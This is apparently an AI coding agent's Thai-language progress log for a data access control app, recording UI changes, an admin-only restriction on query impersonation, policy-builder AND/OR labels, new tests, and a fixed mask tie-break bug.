ผู้ใช้สั่ง *"อยากให้เพิ่มหน้า profile ที่บอกว่าตัวเองมี User attribute อะไรบ้าง"*

เป็นหน้า **อ่านอย่างเดียว** ไม่ใช่หน้า settings — ตอบคำถามที่คนถามหลังโดนปฏิเสธไม่ให้เข้า table ว่า "ระบบคิดว่าฉันเป็นใคร" เดิมทางเดียวที่จะเห็น attribute ของตัวเองคือไปที่ directory (`/principals`) ซึ่งลิสต์ทุกคนและอ่านแล้วเหมือนเรื่องของคนอื่น

- `frontend/app/src/pages/ProfilePage.tsx` — ตัวตน · **Attributes** · Groups · Platform roles
- เรียก `GET /v1/principals/{id}` ด้วย **id จาก token** (username ไม่ unique ข้าม directory) · endpoint นี้เป็น `@Secured` เฉยๆ ไม่ได้จำกัด role อยู่แล้ว
- route `/profile` + เมนู **Your profile** ใต้ avatar มุมขวาบน
- **จงใจไม่ใช้ `/principals/:id`** — route นั้นคือ directory (เรื่องของคนอื่น เข้าถึงโดยค้นหา) ส่วน `/profile` ไม่ต้องมี id จึงยังทำงานได้ถ้าวันหนึ่ง directory ถูกจำกัดเฉพาะ admin

**สามประโยคบนหน้าที่ตั้งใจเขียน ไม่ใช่ filler:**
1. attribute หนึ่ง key มีได้หลายค่า — `clearance` ที่มีทั้ง `L1` และ `L2` ผ่าน policy ที่ขอ L2 (หน้าเว็บ**ห้าม**ยุบสองแถวเป็นแถวเดียว)
2. ไม่มี attribute เลย ≠ ผ่านทุก policy — **engine deny by default** ข้อความจึงเขียนว่า *"Any policy that tests one will refuse"* ไม่ใช่ *"ยังไม่มีข้อมูล"* เฉยๆ
3. **platform role ไม่ใช่สิทธิ์เข้าข้อมูล** — `PLATFORM_ADMIN` บอกว่าทำอะไรกับ *ARAK* ได้ ไม่ได้แปลว่าเห็นแถวไหนในตารางลูกค้า คนสับสนข้อนี้บ่อย

**เทสต์ 3 ตัวใน `ProfilePage.test.tsx`** — เพราะ account เดียวที่ login ได้บนเครื่อง dev (`admin`) **มี attribute = 0** ทางที่จะพิสูจน์ layout ตอนมีข้อมูลจริงจึงไม่มีในเบราว์เซอร์ ต้อง mock
⚠️ **กับดัก:** `getAllByText('clearance')` ได้ 3 ไม่ใช่ 2 เพราะประโยคอธิบายด้านบนใช้ `<code>clearance</code>` เป็นตัวอย่าง → แก้ด้วยการใส่ `aria-label="Your attributes"` / `"Your groups"` ให้ `<ul>` แล้ว query ด้วย `within()` (ได้ a11y เป็นของแถม)

### AJ.3 เทสต์

| ชุด | ก่อน | หลัง |
|---|---|---|
| Frontend | 20 suites / 123 | **21 suites / 126** (+`ProfilePage.test.tsx` 3) |

`npx tsc --noEmit` exit 0 · `npx eslint` สะอาด · backend `package` BUILD SUCCESS · rebuild `dist` + restart backend แล้ว (ตามกฎข้อ AI.1)

---

## รอบก่อนหน้า — **build ที่ผู้ใช้เห็นอยู่เก่าไป 1 ชั่วโมง** · ชิปบอกคำว่า inherited · **query แทนคนอื่นเหลือแค่ admin** · และ **subscription policy เลือกได้แค่ระดับ table**

ผู้ใช้ส่งภาพหน้าจอมาบอกว่า "ไม่เห็นมีอะไรเปลี่ยนเลย" — ทั้งลูกศรขึ้นลงบนแถบแท็บที่บอกว่าแก้แล้ว และชิป Domain ที่ยังขึ้นชื่อจากกลาง FQN **คำตอบคือโค้ดถูก แต่ของที่เสิร์ฟอยู่เก่า** ส่วนที่เหลือเป็นคำสั่งใหม่สี่ข้อ

### AI.1 🪤 ที่เสียเวลามากที่สุดรอบนี้ — **แก้โค้ดแล้วไม่ได้ build ใหม่**

ผู้ใช้ดูที่ `http://localhost:8090/Arak/` ซึ่งคือ **jar เสิร์ฟ `frontend/app/dist`** ไม่ใช่ Vite dev ที่ `:3000`

```
dist/index.html                          16:06
src/pages/catalog/AssetDetailPage.tsx    17:04   <- แก้หลัง build ไป 1 ชั่วโมง
```

ทุกอย่างที่รายงานว่า "เสร็จแล้ว" ในรอบก่อน — กรอบแท็บ, cursor pointer, ลูกศรขึ้นลงหาย, ชิปขึ้นต้นด้วยชื่อชนิด — **อยู่ในโค้ดจริงทั้งหมด แต่ไม่เคยถึงเบราว์เซอร์** ผู้ใช้จึงเห็นของเก่าและสรุปว่ายังไม่ได้แก้ ซึ่งถูกจากมุมของเขา

**กฎที่ต้องทำทุกครั้งที่แตะ `frontend/app/src` แล้วจะให้ผู้ใช้ดู:**

```bash
cd frontend/app && MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build
# แล้ว restart backend เพราะ jar cache index.html ไว้
```

ทั้งสองบรรทัดจำเป็น — ข้ามข้อไหนข้อหนึ่งก็ได้ผลเหมือนไม่ได้แก้

**หลัง build + restart แล้ว ตรวจจากเบราว์เซอร์จริง:**

| | ผล |
|---|---|
| `[role=tablist]` `overflowY` | `hidden` |
| แถบแท็บมี scrollbar แนวตั้งไหม | **ไม่มี** (`scrollHeight > clientHeight` = false) |
| กรอบแท็บ | `1px` · แท็บที่เลือกเป็นสีน้ำเงิน |
| cursor บนแท็บ | `pointer` |
| ชิปบนหน้า `dtp-iprm.iprm.public.employees` | `Domain Premium Service Delivery - IOS Data/DTP - Sub Domain inherited` |

ชิป Domain ขึ้นต้นด้วยคำว่า `Domain` แล้ว และชื่อเริ่มอ่านจากตัวแรกไม่ใช่กลาง FQN ตามที่ผู้ใช้ทัก

### AI.2 ลูกศรขึ้นบนชิป → เขียนคำว่า `inherited` ไปเลย

ผู้ใช้ถามว่า "เครื่องหมายนี้หมายถึงอะไรอะ แก้ได้ไหม ดูไม่สวย" — คำถามนี้คือคำตอบอยู่ในตัว สัญลักษณ์ที่ต้องมีคนอธิบายให้ฟังก่อนถึงจะอ่านออก ไม่ได้ทำหน้าที่อะไรเลย ที่แย่กว่านั้นคือมันมี `aria-hidden` ด้วย แปลว่าคนที่ใช้ screen reader ไม่ได้ข้อมูลนี้เลยตั้งแต่แรก

`src/pages/catalog/facets.tsx` — ทั้ง `FacetChip` และ `OwnerChip`:

```tsx
{!facet.direct && (
  <span className="tw:ml-1 tw:shrink-0 tw:text-[10px] tw:opacity-70">
    inherited
  </span>
)}
```

ยาวขึ้น 9 ตัวอักษร แลกกับไม่ต้องมีคำอธิบายประกอบ และ screen reader อ่านได้ด้วย (ถอด `aria-hidden` ออก)

### AI.3 หัวข้อหน้า Policies — ตัดบรรทัดตรงที่ประโยคจบ

ผู้ใช้ระบุจุดตัดมาเอง: จบบรรทัดแรกที่ `...down to` แล้วขึ้นบรรทัดใหม่ที่ `a single column`

ปล่อยให้ wrap เองแล้วบรรทัดสองเหลือสามคำโดดๆ และ `text-pretty` ก็แค่เปลี่ยนว่าสามคำไหน — จุดตัดที่อ่านแล้วเหมือนตั้งใจมีอยู่จุดเดียวคือตรงรอยต่อของประโยค `src/pages/policies/PolicyListPage.tsx` ใส่ `<br />` ตรงนั้นและเพิ่ม `tw:max-w-3xl`

### AI.4 🔒 Query แทนคนอื่น — เหลือแค่ PLATFORM_ADMIN

คำสั่งผู้ใช้: `Query as คนอื่น ให้ทำได้แค่ admin นะ คนอื่นต้องทำไม่ได้`

เดิม `QueryResource.mayImpersonate()` ยอมให้ 4 role: `PLATFORM_ADMIN` · `POLICY_AUTHOR` · `DATA_OWNER` · `AUDITOR` เหตุผลเดิมคือ "คนเขียน policy ต้องทดสอบก่อน publish" แต่เหตุผลนั้นไม่ครอบคลุมสิ่งที่ฟีเจอร์นี้ทำจริง — **แถวที่ได้กลับมาคือแถวของคนนั้น** ฟีเจอร์นี้จึงอ่านข้อมูลแทนเขา และ policy author ที่ถือสิทธิ์นี้อ่าน table ไหนก็ได้ เพียงแค่ระบุชื่อคนที่เข้าถึง table นั้นได้

```java
private static boolean mayImpersonate(AuthenticatedUser user) {
  return user.isPlatformAdmin();
}
```

**สิ่งที่ policy author ยังทำได้เหมือนเดิม:** Simulator (FR-5.2) — ตอบคำถามเดียวกันว่า "คนนี้จะเห็นอะไร" โดยไม่ส่งข้อมูลจริงกลับมา

**สิ่งที่ไม่เปลี่ยน:** การ impersonate ไม่เคยเป็นช่องผ่าน policy — query ถูก evaluate ในนามคนที่ถูกระบุ admin จึงเห็นเท่าที่คนนั้นเห็นพอดี และ audit บันทึกในชื่อ admin เอง

ฝั่ง UI (`QueryPage.tsx`) ซ่อน Select `Run as` เมื่อไม่ใช่ admin และ **ไม่ยิง `fetchPrincipals` เลย** (`enabled: isAdmin`) — ตัวบังคับจริงอยู่ที่ server ตามเดิม

### AI.5 Subscription policy — เลือกได้แค่ระดับ **Table**

คำสั่งผู้ใช้: `ปรับ Subscription Policy ให้ มีให้เลือกแค่ระดับ table ก่อน ระดับอื่น hide ไปก่อน`

> **อัปเดต (ข้อ CP):** เปิดระดับ **Organisation** กลับแล้ว — `SUBSCRIPTION_LEVELS = ['ORG', 'TABLE']` · ชั้นกลางยังซ่อนอยู่
>
> **อัปเดต (ข้อ CV):** ผู้ใช้ขอให้เอาทุกระดับกลับมา (step 3 กรองต่อได้อยู่แล้ว) — ลบ `SUBSCRIPTION_LEVELS` / `levelOptions()` ออก โค้ดข้างล่างเป็นของเก่า

`src/pages/policies/PolicyBuilderPage.tsx`:

```ts
const SUBSCRIPTION_LEVELS: Policy['scopeLevel'][] = ['TABLE'];

function levelOptions(policy: Policy) {
  if (policy.policyType !== 'SUBSCRIPTION') return SCOPE_LEVELS;
  return SCOPE_LEVELS.filter(
    (level) =>
      SUBSCRIPTION_LEVELS.includes(level.value) || level.value === policy.scopeLevel
  );
}
```

**สามจุดที่ต้องระวังและจัดการไว้แล้ว:**

1. **policy เดิมที่อยู่ชั้นอื่นต้องเก็บชั้นของตัวเองไว้ในเมนู** — ไม่งั้น `finance-subscription` (ORG) ที่เปิดมาแก้เรื่องอื่น จะโดน save ทับเป็น TABLE เงียบๆ ทั้งที่ไม่มีใครสั่ง → `levelOptions` จึงเติม `policy.scopeLevel` เข้าไปเสมอ
2. **`EMPTY.scopeLevel` เปลี่ยนเป็น `TABLE`** ไม่งั้น draft ใหม่ถือค่าที่ไม่มีในเมนู
3. **data policy ยังเปิดมาที่ ORG เหมือนเดิม** — mask ตาม tag เขียนครั้งเดียวคุมทั้งองค์กรคือจุดขายของมัน และ data policy ชั้นนอกไม่เคยล็อกใครออก มันแค่เพิ่ม mask

**ตรวจจากเบราว์เซอร์จริง:**

| หน้า | ตัวเลือกใน Level |
|---|---|
| `policies/new?kind=SUBSCRIPTION` | `["Table"]` |
| `policies/new?kind=DATA` | `["Organisation","Domain or sub-domain","Service","Database","Schema","Table","Column"]` |
| แก้ `finance-subscription` (ORG, subscription) | `["Organisation","Table"]` <- ชั้นของตัวเองยังอยู่ |

> **เหตุผลที่ซ่อน ไม่ใช่ลบ:** engine ยัง compose ครบเจ็ดชั้นและ document ที่เก็บไว้ยังถือครบเจ็ดชั้น — subscription ที่เขียนไว้ชั้นนอกเป็น gate ของทุกอย่างใต้มัน ซึ่งเป็นทั้งประโยชน์ของมันและเป็นเหตุผลที่ grant ตรงบน table เดียวออกมาเป็น "In force · lets nobody in" ได้ ตราบใดที่หน้าจอยังไม่อธิบายเรื่องนี้ตรงจุดที่คนไปเจอ การเปิดชั้นนอกให้เลือกในฟอร์มคือการยื่นปืนให้ยิงเท้าตัวเอง

### AI.6 ผลรันจริงรอบนี้

| | |
|---|---|
| `npx tsc --noEmit` | exit 0 |
| `npx eslint` 4 ไฟล์ที่แก้ | สะอาด |
| `npx jest` | **20 suites / 123 tests** เขียวหมด |
| `./mvnw -o -pl backend/dac-engine -am test` | **277 tests** เขียวหมด · BUILD SUCCESS |
| `vite build` | ผ่าน · restart backend แล้ว `http://localhost:8090/Arak/` ตอบ 200 |

### AI.7 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `frontend/app/src/pages/catalog/facets.tsx` | ลูกศรขึ้น -> คำว่า `inherited` (ทั้ง `FacetChip` และ `OwnerChip`) · ถอด `aria-hidden` |
| `frontend/app/src/pages/policies/PolicyListPage.tsx` | `<br />` ตรงรอยต่อประโยค + `tw:max-w-3xl` |
| `frontend/app/src/pages/policies/PolicyBuilderPage.tsx` | `SCOPE_LEVELS` · `SUBSCRIPTION_LEVELS` · `levelOptions()` · `EMPTY.scopeLevel = 'TABLE'` · placeholder ของ Anchor ตามชั้น |
| `frontend/app/src/pages/query/QueryPage.tsx` | ซ่อน `Run as` เมื่อไม่ใช่ admin · `fetchPrincipals` `enabled: isAdmin` |
| `backend/.../resources/QueryResource.java` | `mayImpersonate()` -> `isPlatformAdmin()` เท่านั้น (⚠️ ไฟล์เป็น **CRLF**) |

### AI.8 ยังค้าง

- **Save query / share query** (ข้อสุดท้ายของคิว UI) — ยังไม่เริ่ม · recon แล้ว: ต้องมี `V12__saved_query.sql` + store + Jersey resource + tests + UI บน `QueryPage.tsx` · **ข้อควรระวังด้านความปลอดภัย: สิ่งที่แชร์คือ *ประโยค SQL* ไม่ใช่ผลลัพธ์ — คนเปิดต้องถูก evaluate ใหม่ในนามตัวเอง** และยังมีความเสี่ยงตกค้างว่า literal ใน `WHERE` เองก็เป็นข้อมูลได้
- **ชื่อ policy ที่บล็อก grant อยู่ ยังไม่ทะลุถึงหน้า Access** — `PolicyEngine.decideSubscription()` ยิง `DecisionReason` ที่ระบุชื่อ policy ของ gate แล้ว (รอบนี้ compile + 277 tests ผ่าน) แต่ `AccessQuery.onAsset()` ยัง `continue` ทิ้ง `decision.getReasons()` บนขา `!allowed` และ `AccessTab.tsx` ยังเขียนลอยๆ ว่า "A policy on an outer layer is refusing them"
- **ยังไม่ได้ตอบ**: จะเปิด `allowLocalOverride` ให้ `finance-subscription` (`b594579f-a825-42bc-9dac-64de9b279d03`) หรือไม่ — **ไม่แตะข้อมูลผู้ใช้โดยไม่ได้สั่ง**
- **คำถามที่ผู้ใช้ถามค้างไว้**: พื้นที่ใต้แถบแท็บควรอยู่ในกรอบเดียวกับแท็บและเป็นพื้นขาวด้วยหรือไม่ — ตอนนี้แท็บมีกรอบของตัวเอง ส่วนเนื้อหาเป็นการ์ดขาวบนพื้นเทาของหน้า

---

## รอบก่อนหน้า — **ชิปเอาเส้นขอบออก** · **บอกให้ชัดว่าตรงไหน and ตรงไหน or** · และ **เทสต์ data policy ที่ชนกัน ซึ่งไปเจอบั๊กจริง**

สามเรื่อง มาจากคำสั่งผู้ใช้สามข้อในรอบเดียว: `Tag ลองแบบไม่มีเส้นขอบแทน`, `ทำให้ชัดสิ ว่าตรงไหน เป็น and ตรงไหน เป็น or`, `ทดสอบทุก Case ให้ครบนะ อย่าลืม Case Datapolicy Conflict กันด้วย`

---

### AH.1 ชิป — เอาเส้นขอบออก เหลือแค่พื้นกับตัวอักษร

รอบที่แล้วเติมเส้นขอบให้ชิปเพื่อให้มันมีรูปร่าง ผู้ใช้ลองแล้วบอกให้เอาออก — **ซึ่งถูก** ที่ขนาด 12px เส้น 1px ที่สีใกล้กับพื้นมาก ๆ จะไม่ตกลงบนเส้น pixel พอดี เบราว์เซอร์เลย blend ออกมาเป็นรอยเปื้อนเทา ๆ รอบชิป ไม่ใช่ขอบ

| | เดิม | ตอนนี้ |
|---|---|---|
| ชิปสี (`pill-color`) | พื้น `-100` + `outline-1` สี `-200` | พื้น `-100` ตัวอักษร `-700` **ไม่มี outline** |
| ชิป facet ที่ตกทอดมา | พื้น `-50` + outline | พื้น `-50` ตัวอักษร `-700` **ไม่มี outline** |
| ชิปขาว (`modern` — เช่น owner) | ขอบเทา | **ยังมีขอบเหมือนเดิม** |

`modern` ยังมีขอบ เพราะพื้นมันขาวเท่าการ์ด ถ้าเอาขอบออกด้วยจะไม่เหลืออะไรบอกว่ามันเป็นชิป

**🪤 กับดัก — เส้นขอบของ badge เป็น prop ไม่ใช่ class** `ui-core-components/src/.../badges.tsx` render `bordered && 'tw:outline-1 tw:-outline-offset-1'` โดย `bordered = true` เป็นค่า default ที่บรรทัด 168/223/283/390/449/525 → **ลบ class สี outline อย่างเดียวไม่พอ** จะเหลือเส้นเทาบาง ๆ ต้องส่ง `bordered={false}` เข้าไป

แก้ที่เดียวได้ทั้งแอปเหมือนเดิม — `Chip` ใน `src/components/chips.tsx` ส่ง `bordered={bordered ?? modern}` (ค่าที่ caller ระบุเองยังชนะ) และ `facets.tsx` ที่เรียก `Badge` ดิบ ๆ ส่ง `bordered={false}` เพิ่มหนึ่งบรรทัด · 17 หน้าที่ `import { Chip as Badge }` ได้ตามทั้งหมดโดยไม่ต้องแก้

**ยืนยันด้วยตาบนของจริง** (`http://localhost:8090/Arak/catalog`, build ด้วย `VITE_BASE=/Arak/` แล้ว restart backend):
- ชิปสีตรง ๆ `rgb(254,228,226)` · ชิปที่ตกทอดมา `rgb(254,243,242)` · **ทั้งคู่ `outline-style: none`**
- **ชั้น `-50` ยังเห็นเป็นรูปร่างอยู่** บนการ์ดสีขาว และยังอ่อนกว่าชั้น `-100` อย่างชัดเจน → **ไม่ต้องขยับสเกลขึ้นเป็น `-100`/`-200`** ตามที่เผื่อไว้
- ชิปขาวของ owner ยังได้ `1px solid rgb(213,215,218)` ตามที่ตั้งใจ

---

### AH.2 ผู้ใช้ถามว่า "อันนี้คือ and หรือ or" — แปลว่าหน้าจอบอกไม่ชัดพอ

คำถามเต็มคือ *"Anyone who is in group x **or** in group Y — หรือ — in group x **and** group Y"* พร้อมรูปที่วงกรอบแดงไว้ที่รายการ `in the group` สองแถว และ `branch is FINANCE` สองแถว

**คำตอบ (ยืนยันกับ engine ไม่ใช่กับข้อความบนจอ):**

| ช่องในฟอร์ม | field ใน `SubjectRule` | ต่อกันด้วย | ยืนยันจาก |
|---|---|---|---|
| **Anyone who is** | `principals` | **OR** | `SubjectMatcher` — แถวไหนแถวหนึ่งผ่านก็พอ |
| **And who is also** | `requiredPrincipals` | **AND** | ต้องผ่านทุกแถว |
| **And whose attributes say** | `attributes` | **AND** | ทุกเงื่อนไขต้องจริง |
| **And this holds** (expression) | `expression` | **AND** กับที่เหลือ | |
| **And only during** | `time.windows` | **OR** | `TimeMatcher.java:59-64` — `return true` ทันทีที่เจอ window แรกที่ครอบเวลานั้น |

> window เป็น **OR** เป็นเรื่องที่ต้องอ่าน code ถึงจะรู้ ถ้าไปเขียนบนจอว่า "all of these" มันจะอธิบายกฎที่**เป็นจริงไม่ได้เลย** เพราะไม่มีวินาทีไหนอยู่ในสอง window ที่ไม่ทับกันพร้อมกัน

**ที่ทำลงไป** — `SubjectBuilder.tsx` เพิ่มสามตัว:
- `JoinTag` — ป้ายบนหัวข้อ: `ANY OF THESE` (ฟ้า) / `ALL OF THESE` (เทา)
- `SectionHeading` — หัวข้อ + ป้าย
- `JoinRow` — **คำว่า `or` / `and` คั่นอยู่ระหว่างแถว** พร้อมเส้นบาง ๆ · ขึ้นเฉพาะตั้งแต่แถวที่สองเป็นต้นไป

เหตุผลที่เลือกวางคำไว้**ระหว่างแถว** ไม่ใช่เขียนอธิบายไว้ข้างบนอย่างเดียว: คำถามนี้เกิดขึ้นตอนที่คนกำลังกดเพิ่มแถวที่สอง ซึ่งเป็นตอนที่ข้อความข้างบนถูกอ่านผ่านไปแล้ว · และเป็น **ตัวอักษร ไม่ใช่สี** คนที่แยกฟ้ากับเทาไม่ออก หรือใช้ screen reader ก็ยังอ่านได้ว่า "or"

**หน้าตาจริงหลัง build** (`/policies/new` กด Add สองครั้งทุกช่อง):
```
Anyone who is  [ANY OF THESE]
  [ in the group ▾ ] [ name ]
  OR ────────────────────────
  [ in the group ▾ ] [ name ]

And whose attributes say  [ALL OF THESE]
  [ branch ] [ is ▾ ] [ FINANCE ]
  AND ───────────────────────
  [ branch ] [ is ▾ ] [ FINANCE ]

And only during  [ANY OF THESE]
  [ weekdays ▾ ] 08:00 to 18:00  Asia/Bangkok
  OR ────────────────────────
```

`SubjectBuilder.test.tsx` — **8 tests ใหม่** ที่ assert ว่าคำบนจอตรงกับที่ engine หมายถึง: ป้ายของสองรายการต้องต่างกัน, สองแถวต้องมีคำคั่น **หนึ่งคำพอดี** (สองคำแปลว่ามีคำห้อยอยู่เหนือแถวแรก), แถวเดียวต้องไม่มีคำคั่น, คำต้องโผล่ **ทันทีที่กด Add who** ไม่ใช่ตัดสินตอนเปิดฟอร์ม, และตอนที่ทั้งสองรายการว่างก็ยังต้องแยกออกจากกันได้ด้วยป้าย

**🪤 กับดัก — test ที่ render `SubjectBuilder` ต้องมี router ครอบ** ข้างในมี `ExpressionNote` ที่ render `<Link to="/docs/expressions">` → ถ้าไม่ครอบ `<MemoryRouter>` จะล้มทั้งไฟล์ด้วย `Cannot destructure property 'basename' of ... as it is null` (`PolicyBuilderPage.test.tsx` ครอบไว้อยู่แล้ว ลอกมาได้)

---

### AH.3 เทสต์ data policy ที่ชนกัน 10 ตัว — แล้วเจอบั๊กจริงที่ไม่ใช่เทสต์ผิด

ก่อนเขียนได้ไล่ดูของเดิมก่อน `DataPolicyCompositionTest` มีเคสอยู่ 30+ แล้ว แต่**ไม่มีเคสที่ mask คนละ function ชนกันบน column เดียวผ่าน engine จริง** มีแต่เทียบ `MaskStrength.rank()` ตรง ๆ · nested class ใหม่ `MaskConflicts` เติมส่วนที่ขาด:

| test | คุม |
|---|---|
| `deeperLayerMayTighten` / `deeperLayerMayNotWeaken` | **FR-3.1.4** — ชั้นล่างเพิ่มความเข้มได้ ผ่อนไม่ได้ · ตัวหลังคือเคสอุบัติเหตุ: ถ้าพัง คนที่เขียน policy ระดับ table ได้ จะลด `NULLIFY` ทั้งองค์กรให้เหลือ partial ได้ และ **query ยังสำเร็จ** ไม่มีจอไหนฟ้อง |
| `theWholeRankingHolds` | ไล่ทุกคู่ที่ติดกันในลำดับ **ทั้งสองทิศ** |
| `conditionalNeverDisplacesAFunction` | `CONDITIONAL` อาจเลือกไม่ mask เลย ห้ามให้มันเบียดของที่ mask เสมอ |
| `threeWayCollisionLeavesOne` | สาม policy บน column เดียว เหลือ mask ใบเดียว |
| `theWinnerIsTheOneOnTheRecord` | **FR-5.4** — ชื่อ policy ที่ติดมากับ mask ต้องเป็นใบที่ชนะ |
| `tiesAreOrderIndependent` | เสมอกันแล้วต้องได้ผลเดิมไม่ว่ามาลำดับไหน |
| `hideBeatsMask` / `hideBeatsMaskFromEitherSide` | hide ชนะ mask เสมอ และต้อง**ไม่**โผล่ใน `columnMasks` ด้วย (ไม่งั้น SQL จะอ้างถึง column ที่ไม่อยู่ใน projection) |
| `collisionIsScopedToItsColumn` | ชนที่ column หนึ่ง ห้ามกระเทือน column อื่น |

> ลำดับความเข้มใน test เขียนเป็น `List` ไว้เอง **ไม่ได้อ่านจาก `MaskStrength`** เพราะ test ที่ไปถามตัวที่มันกำลังตรวจว่าคิดยังไง จะผ่านทุกอย่างที่ตัวนั้นคิด

#### 🐛 `tiesAreOrderIndependent` ล้ม — และมันคือบั๊กจริง

```
expected: ac0a2da2-be48-3a5e-8f44-2617ce58f753
 but was: 475b2f89-6fcd-311c-acd1-3755e1736481
```

`PolicyEngine.stricter()` เขียน comment ไว้ว่า *"Ties keep the incumbent, so composition is order-independent"* แล้ว `return incumbent` — **ซึ่งไม่ใช่ order-independence มันแค่หน้าตาเหมือน** · ตัว mask ออกมาเหมือนกันจริง SQL เลยปลอดภัย แต่ **ชื่อ policy ที่ถูกบันทึกไว้บนนั้นเดินตามลำดับที่โหลดมา** → หน้าจออธิบาย (FR-5.4) จะบอกชื่อ policy คนละใบกันเมื่อ refresh และส่ง owner ไปแก้ใบที่โหลดมาก่อนโดยบังเอิญ

แก้ให้ tie-break เป็น **total order**:
1. ชั้นที่**กว้างกว่า**ชนะ — เพราะมันคือใบที่ยังบังคับ mask นี้อยู่ดีถ้าอีกใบถูกลบ (`ScopeLevel.ordinal()` · ORG = 0 = กว้างสุด · ชั้นที่ไม่มีค่าไม่มีวันชนะ)
2. เสมออีกก็ตัดด้วย policy id

ตรวจแล้วว่าไม่ไปกวน `maskNamesItsLayer` (policy ใบเดียว) และ `unconditionalBeatsConditionalOfEqualStrength` (กติกาเรื่อง condition ตัดสินไปก่อนถึงบรรทัดนี้)

**ผลรัน:** `dac-engine` **267 → 277** · full unit suite **470 → 480** · `./mvnw -am -pl backend/dac-service test` → **exit 0 ทุกโมดูล** (`dac-compiler-sql` golden file ไม่กระเทือน)

---

### AH.4 🪤 กับดักที่เสียเวลาไปรอบนี้

1. **Maven รันด้วย JDK ผิดเงียบ ๆ** — `JAVA_HOME` ที่ติดมากับเครื่องเป็น Java 11 ถ้าไม่ตั้งเอง build จะตายที่ `dac-spec` ด้วย `PluginContainerException` 60 บรรทัดที่บังสาเหตุจริงไว้ สาเหตุจริงคือ `jsonschema2pojo ... class file version 61.0, this version ... up to 55.0`
   ```bash
   export JAVA_HOME="/c/Users/Sakan P/Desktop/Data Access Control App/.tools/jdk-21.0.12.1+1"
   ```
   ⚠️ ต้องเป็น **path แบบ POSIX** · ถ้าใช้ `MSYS_NO_PATHCONV=1 JAVA_HOME="$(pwd -W)/..."` จะได้ `Could not find or load main class org.codehaus.plexus.classworlds.launcher.Launcher` แทน
2. **`./mvnw` อยู่ที่ราก repo ไม่ใช่ใน `backend/`**
3. **heredoc ของ bash พัง** เมื่อเนื้อหาข้างในยาวและมี quote (บล็อก Java 167 บรรทัดทำ `unexpected EOF while looking for matching ''`) → เขียนสคริปต์ลง scratchpad ด้วย Write แล้ว `python <path>` (กับดักเดิมที่บันทึกไว้แล้ว ยังโดนอยู่)

---

### AH.5 ไฟล์ที่แตะรอบนี้

| ไฟล์ | อะไร |
|---|---|
| `frontend/app/src/components/chips.tsx` | เอา outline ออกจากทั้งสอง map · `bordered={bordered ?? modern}` |
| `frontend/app/src/pages/catalog/facets.tsx` | `bordered={false}` หนึ่งบรรทัด |
| `frontend/app/src/pages/policies/SubjectBuilder.tsx` | `JoinTag` / `SectionHeading` / `JoinRow` + เดินสาย or/and เข้าทั้งสี่รายการ |
| `frontend/app/src/pages/policies/SubjectBuilder.test.tsx` | **ใหม่** — 8 tests |
| `backend/dac-engine/src/test/.../DataPolicyCompositionTest.java` | **+167 บรรทัด** — nested class `MaskConflicts` 10 tests |
| `backend/dac-engine/src/main/.../PolicyEngine.java` | tie-break ของ mask เป็น total order (breadth → policy id) |

---

## รอบก่อนหน้า — **Grant กำหนดวันเองได้ (พิมพ์จำนวนวัน / ตั้ง Start–End ล่วงหน้า)** · และ **ชิปทั้งแอปหนาขึ้นจากที่เดียว**

> โจทย์รอบนี้มาสามอัน: *"For how long ตอน Direct access ต้องใส่เลขเองได้ไหม"* · *"แล้วกำหนดล่วงหน้า Start date end date ได้ไหม"* · *"ทำเสร็จแล้วทดสอบให้ดีด้วยนะ"* แล้วระหว่างทางมีอีกอัน: *"tag สีประมาณนี้มันดูบางๆ ไม่สวยอะ ลองปรับให้ดีกว่านี้หน่อย"*

### AG.1 `GrantDialog` — ช่อง **For how long** พิมพ์เลขเองได้ และสลับเป็น **Between** ตั้งวันล่วงหน้าได้

เดิมมีแต่ชิป 5 อัน (`7 / 30 / 90 / 180 วัน` และ `No expiry`) ซึ่งแปลว่า "45 วัน" เขียนไม่ได้เลย และ "เปิดให้ใช้วันที่ 1 เดือนหน้า" ก็เขียนไม่ได้ ทั้งที่ `GrantRequest` ฝั่ง backend รับ `validFrom` มาตั้งแต่แรกและ `NewGrant` ใน `src/api/access.ts` ก็ประกาศ `validFrom?: string | null` ไว้แล้ว — **ไม่ต้องแก้ API หรือ backend สักบรรทัด** ช่องกรอกอย่างเดียวที่หายไป

| โหมด | หน้าตา | ส่งอะไรไป API |
|---|---|---|
| `duration` (ค่าเริ่มต้น) | ชิป 5 อันเดิม **+ ช่อง `or [__] days`** (`aria-label="Number of days"`) | `validFrom: null` · `validUntil = now + N วัน` |
| `dates` | `Starts` / `Ends` แบบ `datetime-local` สองช่อง | ส่ง instant ทั้งสองตัวตามที่กรอก (ว่างได้ทั้งคู่) |

สลับโหมดด้วยลิงก์ข้อความเดียว `Set start and end dates` ⇄ `Use a duration` และใต้ control มีบรรทัดสรุปที่เปลี่ยนตามสิ่งที่กรอกจริง — ถ้ากรอกผิดบรรทัดนี้กลายเป็นข้อความสีแดงและปุ่ม Grant ถูกปิด

**สิ่งที่บรรทัดสรุปตั้งใจบอกให้ได้:** ถ้า `Starts` เป็นอนาคต มันเขียนว่า *"Opens … — until then the grant exists and grants nothing"* เพราะสิ่งเดียวที่คนตั้งเวลาล่วงหน้าพลาดได้โดยไม่รู้ตัวคือคิดว่ากดปุ่มแล้วสิทธิ์มีผลทันที

**บั๊กที่เจอระหว่างทางและแก้ไปด้วย:** helper เดิม (`expiryFrom`) คืน `null` เมื่อจำนวนวันเป็น `0` ซึ่ง API อ่านว่า **"ไม่มีวันหมดอายุ"** — พิมพ์ผิดตัวเดียวได้ grant ที่กว้างที่สุดเท่าที่ระบบให้ได้ ตอนนี้ `0` เป็นข้อความปฏิเสธ (`Give a number of days above zero, or pick No expiry.`) และปุ่มถูกปิด

### AG.2 ทดสอบ — 9 unit tests + **7 checks กับระบบที่รันอยู่จริง**

`GrantDialog.test.tsx` (ใหม่, 9 tests) ใช้ `fireEvent` ล้วน เพราะ `@testing-library/user-event` ไม่ได้ติดตั้งในเรโปนี้ · mock เฉพาะ `fetchPrincipals` · fixture ใช้ `analyst_a@example.com` กับ UUID ปลอม ไม่มีอะไรที่ใช้ยิงของจริงได้

เคสที่ควรรู้ว่าเขียนไว้ทำไม:
- **พิมพ์ 45 วัน** — assert *ช่วงเวลา* (44.9–45.1 วัน) ไม่ใช่ instant เป๊ะๆ เพราะ assert instant คือการ assert นาฬิกา ไม่ใช่ assert สิ่งที่ช่องกรอกสัญญาไว้
